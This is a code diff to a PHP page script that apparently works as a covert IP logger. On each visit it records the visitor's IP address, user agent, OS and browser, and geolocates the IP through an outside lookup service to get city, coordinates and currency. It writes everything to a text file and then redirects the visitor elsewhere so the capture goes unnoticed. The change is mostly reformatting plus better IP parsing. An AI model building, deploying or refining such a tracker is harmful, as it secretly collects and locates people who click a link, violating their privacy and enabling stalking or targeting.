@@ -96,6 +96,9 @@ $user_os        = getOS();
 $user_browser   = getBrowser();
 
 $PublicIP = get_client_ip();
+if (strpos($PublicIP, ',') !== false) {
+    $PublicIP = explode(",", $PublicIP)[0];
+}
 $file       = 'ip.txt';
 $ip         = "IP                   : ".$PublicIP;
 $uaget      = "User Agent: ".$user_agent;
@@ -109,47 +112,43 @@ $details  = file_get_contents("http://ipwhois.app/json/$PublicIP");
 $details  = json_decode($details, true);
 $success  = $details['success'];
 $fp = fopen($file, 'a');
+
 if ($success==false) {
-fwrite($fp, $ip."\n");
-fwrite($fp, $uos."\n");
-fwrite($fp, $version."\n");
-fwrite($fp, $bsr."\n");
-fclose($fp);
+    fwrite($fp, $ip."\n");
+    fwrite($fp, $uos."\n");
+    fwrite($fp, $version."\n");
+    fwrite($fp, $bsr."\n");
+    fclose($fp);
 } else if ($success==true) {
-$country  = $details['country'];
-$city     = $details['city'];
-$continent= $details['continent'];
-$tp       = $details['type'];
-$cn       = $details['country_phone'];
-$is       = $details['isp'];
-$latitude = $details['latitude'];
-$longitude= $details['longitude'];
-$crn      = $details['currency'];
-
-$type       = "IP Type              : ".$tp;
-$comma      = ", ";
-$location   = "Location             : ".$city.$comma.$country.$comma.$continent;
-$geolocation= "GeoLocation(lat, lon): ".$latitude.$comma.$longitude;
-$isp        = "ISP                  : ".$is;
-$country_p  = "Country Code         : ".$cn;
-$currency   = "Currency             : ".$crn;
-fwrite($fp, $ip."\n");
-fwrite($fp, $type."\n");
-fwrite($fp, $uos."\n");
-fwrite($fp, $version."\n");
-fwrite($fp, $bsr."\n");
-fwrite($fp, $location."\n");
-fwrite($fp, $geolocation."\n");
-fwrite($fp, $isp."\n");
-fwrite($fp, $country_p."\n");
-fwrite($fp, $currency."\n\n");
-
-fclose($fp);
+    $country  = $details['country'];
+    $city     = $details['city'];
+    $continent= $details['continent'];
+    $tp       = $details['type'];
+    $cn       = $details['country_phone'];
+    $is       = $details['isp'];
+    $latitude = $details['latitude'];
+    $longitude= $details['longitude'];
+    $crn      = $details['currency'];
+    $type       = "IP Type              : ".$tp;
+    $comma      = ", ";
+    $location   = "Location             : ".$city.$comma.$country.$comma.$continent;
+    $geolocation= "GeoLocation(lat, lon): ".$latitude.$comma.$longitude;
+    $isp        = "ISP                  : ".$is;
+    $currency   = "Currency             : ".$crn;
+    fwrite($fp, $ip."\n");
+    fwrite($fp, $type."\n");
+    fwrite($fp, $uos."\n");
+    fwrite($fp, $version."\n");
+    fwrite($fp, $bsr."\n");
+    fwrite($fp, $location."\n");
+    fwrite($fp, $geolocation."\n");
+    fwrite($fp, $currency."\n");
+    fclose($fp);
 } else {
-$status     = "Status               : ".$success;
-fwrite($fp, $status."\n");
-fwrite($fp, $uaget."\n");
-fclose($fp);
+    $status     = "Status               : ".$success;
+    fwrite($fp, $status."\n");
+    fwrite($fp, $uaget."\n");
+    fclose($fp);
 }
 header("Location: website");
 ?>
